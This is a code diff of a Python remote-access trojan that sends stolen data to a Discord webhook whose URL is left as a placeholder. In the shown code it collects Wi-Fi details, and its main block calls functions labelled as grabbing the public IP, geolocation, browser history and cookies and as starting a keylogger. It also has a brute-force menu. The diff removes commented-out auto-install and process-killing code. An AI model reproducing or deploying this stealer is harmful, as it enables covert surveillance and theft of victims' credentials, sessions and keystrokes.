@@ -14,20 +14,6 @@ from shutil import copyfile
 import psutil
 import time
 
-# # Function to install required libraries
-# def install(package):
-#     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
-
-# # Function to ensure necessary libraries are installed
-# def check_and_install_libraries():
-#     required_libraries = ['keyboard', 'requests', 'pyautogui', 'psutil', 'opencv-python', 'pyaudio', 'wave', 'paramiko', 'sqlite3']
-#     for lib in required_libraries:
-#         try:
-#             __import__(lib)
-#         except ImportError:
-#             install(lib)
-
-# Discord webhook URL (replace with your actual webhook ID and token)
 discord_webhook_url = "ENTER YOUR WEBHOOK HERE"
 
 def send_to_discord(content, title=None):
@@ -142,10 +128,10 @@ def rat4():
 
 def rat13():
     try:
-        if os.name == 'nt':  # Windows
+        if os.name == 'nt':  
             result = subprocess.run(["netsh", "wlan", "show", "interfaces"], capture_output=True, text=True)
             wifi_info = result.stdout
-        else:  # Unix-based systems (e.g., macOS, Linux)
+        else: 
             result = subprocess.run(["iwgetid"], capture_output=True, text=True)
             wifi_info = result.stdout
         send_to_discord(f"**Wi-Fi Information:**\n```{wifi_info}```", title="Wi-Fi Information")
@@ -283,47 +269,11 @@ def brute_force_menu():
             print("Invalid choice. Please try again.")
         os.system('cls' if os.name == 'nt' else 'clear')
 
-# def close_all_except_discord_and_self(max_processes=50):
-#     try:
-#         current_pid = os.getpid()  # Get the PID of the current script
-#         closed_count = 0  # Counter for closed processes
-
-#         for proc in psutil.process_iter(['pid', 'name']):
-#             process_name = proc.info['name'].lower()
-#             process_pid = proc.info['pid']
-
-#             # Skip Discord, NVIDIA processes, the current script, and critical system processes
-#             if "rat" in process_name or"visual" in process_name or "brave" in process_name or "discord" in process_name or "nvidia" in process_name or process_pid == current_pid:
-#                 continue
-
-#             try:
-#                 # Terminate the process
-#                 proc.terminate()
-#                 proc.wait(timeout=3)  # Wait for the process to terminate
-#                 closed_count += 1
-#                 print(f"Terminated: {process_name}")
-
-#                 # Stop if the maximum number of processes has been closed
-#                 if closed_count >= max_processes:
-#                     print(f"Reached maximum limit of {max_processes} processes.")
-#                     break
-
-#             except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.TimeoutExpired):
-#                 pass
-#     except Exception as e:
-#          send_to_discord(f"Error closing programs: {e}")
-
-#  # Call the close_all_except_discord_and_self function after installing libraries
-#  if __name__ == "__main__":
-#      check_and_install_libraries()
-#      close_all_except_discord_and_self()  # Close programs except Discord and the script itself
-#      os.system('cls' if os.name == 'nt' else 'clear')
 
 if __name__ == "__main__":
-    #check_and_install_libraries()
+
     os.system('cls' if os.name == 'nt' else 'clear')
 
-    # Run RATs
    
     rat1()  # Grab public IP
     rat10()  # Get geolocation
@@ -339,6 +289,4 @@ if __name__ == "__main__":
     get_browser_history()  # Get browser history
     get_browser_cookies()  # Get browser cookies
     rat4()  # Start keylogger
-    time.sleep(25)
-    #close_all_except_discord_and_self()
-    #brute_force_menu()
+
